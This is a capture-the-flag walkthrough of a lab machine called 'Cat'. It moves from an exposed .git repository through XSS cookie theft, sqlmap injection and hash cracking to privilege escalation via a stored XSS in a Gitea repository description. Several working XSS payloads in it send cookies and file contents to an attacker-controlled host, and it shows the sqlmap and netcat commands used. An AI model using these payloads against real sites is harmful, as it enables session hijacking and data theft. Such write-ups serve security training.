# 🐱 Cat CTF - Walkthrough

## 🔍 Initial Reconnaissance

I began by running an `nmap` scan on the target machine:

```bash
nmap -sC -sV -A 10.10.11.53
```

The scan revealed two open ports and an interesting `.git` repository:

-   **🛡️ Port 22** → SSH (OpenSSH 8.2p1 Ubuntu)
-   **🌐 Port 80** → HTTP (Apache httpd 2.4.41 Ubuntu)
-   **Gitea Repository:** Found at `10.10.11.53:80/.git/`

I added `cat.htb` to `/etc/hosts` and navigated to the website.

## 🌐 Website & Git Repo Analysis - XSS and Admin Cookie Acquisition

The website on port 80 was a "Best Cat Competition" site. I registered an account and logged in. The `nmap` scan indicated an exposed `.git` repository, which I immediately dumped to analyze the source code.

Inspecting `view_cat.php` in the dumped repository, I noticed that the `cat_name` was displayed without proper sanitization. This indicated a potential **Cross-Site Scripting (XSS)** vulnerability.

I prepared an XSS payload to steal the admin's cookie. The payload would be injected into the `cat_name` field when registering a new cat.

```html
<img src=x onerror="fetch('http://MyIp:9001/?c='+btoa(document.cookie));"></img>
```

I then set up a `netcat` listener on my attacking machine on port `9001`:

```bash
nc -lknvp 9001
```

I registered a new user, then proceeded to "Contest" page to submit a new cat using the XSS payload as the cat's name. When the admin later reviewed the cat, my `netcat` listener received a base64 encoded cookie.

Decoding the base64 string `UEhQU0VTU0lEPXNjYWI0c2Y1NHFqZnVhOTRoZjNhYmFmMXIy` revealed the admin's `PHPSESSID`: `scab4sf54qjfua94hf3abaf1r2`.

By replacing my browser's `PHPSESSID` cookie with this value, I gained access to the admin panel (`admin.php`).

## 💥 SQL Injection via Admin Panel

In the `admin.php` panel, I found an option to accept/reject cats. Reviewing the `accept_cat.php` source code from the Git repository, I found a clear SQL Injection vulnerability:

```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```

The `$cat_name` variable was directly inserted into the SQL query without sanitization.

I used `sqlmap` with the acquired admin cookie to exploit this vulnerability, targeting the `catName` parameter.

```bash
sqlmap -u "http://cat.htb/accept_cat.php" --cookie="PHPSESSID=scab4sf54qjfua94hf3abaf1r2" --data="catId=1&catName=123" -p catName --dbms=SQLite --level=5 --tables --threads 10
```

`sqlmap` successfully identified the `users` table. I then dumped its contents:

```bash
sqlmap -u "http://cat.htb/accept_cat.php" --cookie="PHPSESSID=scab4sf54qjfua94hf3abaf1r2" --data="catId=1&catName=123" -p catName --dbms=SQLite --level=5 --threads=10 -T users --dump
```

This dumped several user hashes. I extracted the hashes into a file and used `john the Ripper` with the `rockyou.txt` wordlist to crack them:

```bash
john --format=raw-md5 --wordlist=~/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

This revealed the password for the user **rosa**: `soyunaprincesarosa`.

I used these credentials to log in via SSH:

```bash
ssh rosa@cat.htb
```

✅ I successfully gained a shell as **rosa**. However, the `user.txt` flag was not in `rosa`'s home directory.

## ➡️ Lateral Movement to Axel

I enumerated listening ports on the system:

```bash
netstat -tanup
```

I noticed a service listening on port `3000` locally (`127.0.0.1:3000`), which is a common port for Gitea.

I also checked `rosa`'s mail (`/var/mail/rosa`). While it contained output from some `id` commands, it didn't immediately lead to further access.

I then used `linpeas` for a thorough system enumeration. `linpeas` highlighted readable files belonging to root and readable by members of the `adm` group (which `rosa` was a part of).

Reviewing `/var/log/apache2/access.log`, I searched for passwords and found credentials for the user **axel** in a `loginPassword` field: `aNdZwgC4tI9gnVXv_e3Q`.

I used these credentials to log in via SSH:

```bash
ssh axel@cat.htb
```

✅ I successfully gained a shell as **axel** and retrieved the **user flag**.

## ⬆️ Privilege Escalation to Root

While inspecting `axel`'s mail (`/var/mail/axel`), I found an email from `rosa` mentioning new "cat-related web services" and an "Employee management system" hosted on Gitea at `http://localhost:3000/administrator/Employee-management/`. The email also stated that "Jobert will check if it is a promising service that we can develop" and emphasized including "a clear description of the idea so that I can understand it properly. I will review the whole repository."

This suggested a potential XSS vulnerability within Gitea's repository description, which `Jobert` (likely a high-privileged user) would trigger when reviewing.

I created an SSH tunnel to access the Gitea instance on port `3000` from my local machine:

```bash
ssh -L 3000:localhost:3000 axel@cat.htb
```

I logged into Gitea as `axel` using the password `aNdZwgC4tI9gnVXv_e3Q`. I created a new repository and injected an XSS payload into its description. This payload was designed to fetch the content of specific files and send them to a web server I controlled.

First, I tested by trying to retrieve the `README.md` content of a specific repository (after ensuring my repo had a `README.md` file):

```html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://MyIP:8080/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS</a>
```

I then started a Python web server on my attacking machine to capture the data:

```bash
python3 -m http.server 8080
```

I sent an email to `jobert@cat.htb` with a link to my repository to trigger the XSS. Upon `Jobert` viewing the repository, my web server received base64 encoded data. After decoding, it revealed the content of the `README.md`.

Next, I modified the XSS payload to fetch `index.php` from the "Employee Management" repository, as this seemed like a more promising file for credentials:

```html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://MyIp:8080/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS</a>
```

After triggering the XSS again by sending an email to `jobert`, I received and decoded the `index.php` content:

```php
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
```

This file contained hardcoded credentials: `admin` with the password `IKw75eR0MR7CMIxhH0`.

I tried these credentials with the `su` command from `axel`'s shell:

```bash
su admin
```

Using the password `IKw75eR0MR7CMIxhH0` as `admin` (or directly with `su -`), I successfully switched to the `root` user.

✅ I retrieved the **root flag** from `/root/root.txt`.

## 🎯 Conclusion

The **Cat** machine was successfully completed! 🧩

-   Initial access gained through XSS to steal admin cookie, followed by SQL Injection in the admin panel to retrieve user hashes.
-   Lateral movement to `rosa` by cracking her password and SSH login.
-   Further lateral movement to `axel` by finding credentials in Apache access logs.
-   Privilege escalation to `root` through an XSS in Gitea's repository description, exploiting `Jobert` to retrieve hardcoded root credentials.
-   User and root flags acquired! 🏁

---